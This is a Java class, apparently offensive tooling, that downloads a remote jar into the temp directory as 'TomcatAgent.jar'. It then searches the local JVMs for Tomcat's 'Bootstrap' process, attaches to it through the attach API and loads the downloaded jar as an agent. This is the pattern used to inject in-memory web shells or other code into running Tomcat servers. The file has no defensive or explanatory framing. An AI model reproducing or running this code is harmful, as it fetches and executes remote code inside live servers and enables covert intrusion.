package echo;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class AppRunStart {

    public static void loadClassPath(String jdkPath) throws IOException, ClassNotFoundException {
        List<String> ClassList = new ArrayList<>();
        Map<String,Class<?>> classMap = new HashMap<String,Class<?>>();



        URL url1 = new URL(jdkPath);
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[] { url1 }, Thread.currentThread()
                .getContextClassLoader());
        Class<?> virtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
        classMap.put("com.sun.tools.attach.VirtualMachine", virtualMachine);
        Class<?> hostIdentifier = urlClassLoader.loadClass("sun.jvmstat.monitor.HostIdentifier");
        classMap.put("sun.jvmstat.monitor.HostIdentifier", hostIdentifier);
        Class<?> monitorException = urlClassLoader.loadClass("sun.jvmstat.monitor.MonitorException");
        classMap.put("sun.jvmstat.monitor.MonitorException", monitorException);
        Class<?> monitoredHost = urlClassLoader.loadClass("sun.jvmstat.monitor.MonitoredHost");
        classMap.put("sun.jvmstat.monitor.MonitoredHost", monitoredHost);
        Class<?> monitoredVm = urlClassLoader.loadClass("sun.jvmstat.monitor.MonitoredVm");
        classMap.put("sun.jvmstat.monitor.MonitoredVm", monitoredVm);
        Class<?> monitoredVmUtil = urlClassLoader.loadClass("sun.jvmstat.monitor.MonitoredVmUtil");
        classMap.put("sun.jvmstat.monitor.MonitoredVmUtil", monitoredVmUtil);
        Class<?> vmIdentifier = urlClassLoader.loadClass("sun.jvmstat.monitor.VmIdentifier");
        classMap.put("sun.jvmstat.monitor.VmIdentifier", vmIdentifier);

        try {
            Object hostId = classMap.get("sun.jvmstat.monitor.HostIdentifier").getDeclaredConstructor(String.class).newInstance("localhost");
            Method getMonitoredHost = classMap.get("sun.jvmstat.monitor.MonitoredHost").getMethod("getMonitoredHost",classMap.get("sun.jvmstat.monitor.HostIdentifier"));
            Object mHost = getMonitoredHost.invoke(classMap.get("sun.jvmstat.monitor.MonitoredHost"),hostId);
            Method activeVms = classMap.get("sun.jvmstat.monitor.MonitoredHost").getMethod("activeVms");
            Set jvms = (Set) activeVms.invoke(mHost);
            for (Iterator j = jvms.iterator(); j.hasNext(); ) {
                int lvmid = ((Integer) j.next()).intValue();
                //System.out.println(String.valueOf(lvmid));
                try {
                    String vmidString = "//" + lvmid + "?mode=r";
                    Object id = classMap.get("sun.jvmstat.monitor.VmIdentifier").getDeclaredConstructor(String.class).newInstance(vmidString);
                    Method getMonitoredVm = classMap.get("sun.jvmstat.monitor.MonitoredHost").getMethod("getMonitoredVm",classMap.get("sun.jvmstat.monitor.VmIdentifier"),int.class);
                    Object vm = getMonitoredVm.invoke(mHost,id,0);
                    Method mainClass = classMap.get("sun.jvmstat.monitor.MonitoredVmUtil").getMethod("mainClass",classMap.get("sun.jvmstat.monitor.MonitoredVm"),boolean.class);
                    String mainName = (String) mainClass.invoke(classMap.get("sun.jvmstat.monitor.MonitoredVmUtil"),vm,false);
                    if(mainName.equals("Bootstrap")) {
                        Method attach = classMap.get("com.sun.tools.attach.VirtualMachine").getMethod("attach", String.class);
                        Object vMachine = attach.invoke(classMap.get("com.sun.tools.attach.VirtualMachine"),String.valueOf(lvmid));
                        Method loadAgent = classMap.get("com.sun.tools.attach.VirtualMachine").getMethod("loadAgent", String.class);
                        loadAgent.invoke(vMachine,System.getProperty("java.io.tmpdir") + "TomcatAgent.jar");
                        System.out.println("Load Agent Successful!");
                    }
                }catch (Exception e) {
                    e.printStackTrace();
                } finally {
                }
            }
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }

    public static void downloadFile(String remoteFilePath, String localFilePath)
    {
        URL urlfile = null;
        HttpURLConnection httpUrl = null;
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        File f = new File(localFilePath);
        try
        {
            urlfile = new URL(remoteFilePath);
            httpUrl = (HttpURLConnection)urlfile.openConnection();
            httpUrl.connect();
            bis = new BufferedInputStream(httpUrl.getInputStream());
            bos = new BufferedOutputStream(new FileOutputStream(f));
            int len = 2048;
            byte[] b = new byte[len];
            while ((len = bis.read(b)) != -1)
            {
                bos.write(b, 0, len);
            }
            bos.flush();
            bis.close();
            httpUrl.disconnect();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        finally
        {
            try
            {
                bis.close();
                bos.close();
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        }
    }

    public static void getURLAgent(String url) {
        String tempPath = System.getProperty("java.io.tmpdir") + "TomcatAgent.jar";
        downloadFile(url,tempPath);
    }

    /**
     *
     * @param remoteJar "http://192.168.30.249:8080/xxx.jar"
     * @param jdkPath "file:C:\\Program Files\\Java\\jdk1.8.0\\lib\\tools.jar"
     * @throws IOException
     * @throws ClassNotFoundException
     */
    public AppRunStart(String remoteJar,String jdkPath) throws Exception {
        getURLAgent(remoteJar);
        loadClassPath(jdkPath);
    }

}
